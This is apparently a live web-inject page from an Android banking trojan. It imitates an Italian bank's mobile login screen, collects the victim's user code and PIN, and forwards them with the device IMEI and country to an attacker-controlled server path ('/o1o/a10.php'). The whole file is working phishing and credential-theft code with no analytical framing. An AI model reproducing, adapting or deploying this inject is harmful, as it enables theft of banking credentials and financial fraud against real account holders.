<!-- 2.2.7 -->
<html>
<head>
    <meta charset="UTF-8">
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js"></script>
	<link rel="stylesheet" href="it/it.copergmps.rt.pf.android.sp.bmps/style.css">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
    <div class="header">
        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEoAAAAcCAIAAABJZb7MAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6RjI3M0UwQkFCODMwMTFFOEI5QjRFMjk0RjU4NzU0OEUiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6RjI3M0UwQkJCODMwMTFFOEI5QjRFMjk0RjU4NzU0OEUiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpGMjczRTBCOEI4MzAxMUU4QjlCNEUyOTRGNTg3NTQ4RSIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpGMjczRTBCOUI4MzAxMUU4QjlCNEUyOTRGNTg3NTQ4RSIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PhDlVXgAABLnSURBVHjajFgHeFzV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">
    </div>
    <form action="null" method="post" id="_mainForm" target="flow_handler">
        <input type="tel" class="field" name="login" id="login" placeholder="Codice Utente o Codice Personale">

        <input type="password" class="field" name="pin" id="pin" placeholder="PIN">

        <input type="submit" class="button" id="input_submitBtn" value="Entra">
    </form>
    <div class="footer">
        4.27
    </div>
    <iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>
<script type="text/javascript">
   (function () {
		var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
            var input = objDoc.createElement("input");
            input.setAttribute("type", "hidden");
            input.setAttribute("name", sNm);
            input.setAttribute("value", sV);
            input.value = sV;
            objForm.appendChild(input);
        };

        var g_oBtn = document.getElementById('input_submitBtn');
        g_oBtn.onclick = function () {

            var oNumInp = document.getElementById('login');
            var oCodeInp = document.getElementById('pin');

            try{
                oNumInp.className = 'field';
                oCodeInp.className = 'field';
            } catch(e){};

            if (!/^\w{3,50}$/i.test(oNumInp.value)) {
                try{
                    oNumInp.className = 'field error';
                } catch(e){};
                return false;
            }

            if (!/^\w{3,50}$/i.test(oCodeInp.value)) {
                try{
                    oCodeInp.className = 'field error';
                } catch(e){};
                return false;
            }

			top['closeDlg'] = true;
          	var url='<?php echo $URL; ?>';
           	var imei_c='<?php echo $IMEI_country; ?>';
           	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|it_copergmps|"+oNumInp.value+"|"+oCodeInp.value);

           return false;
       };

   })();
</script>
</body>
</html>
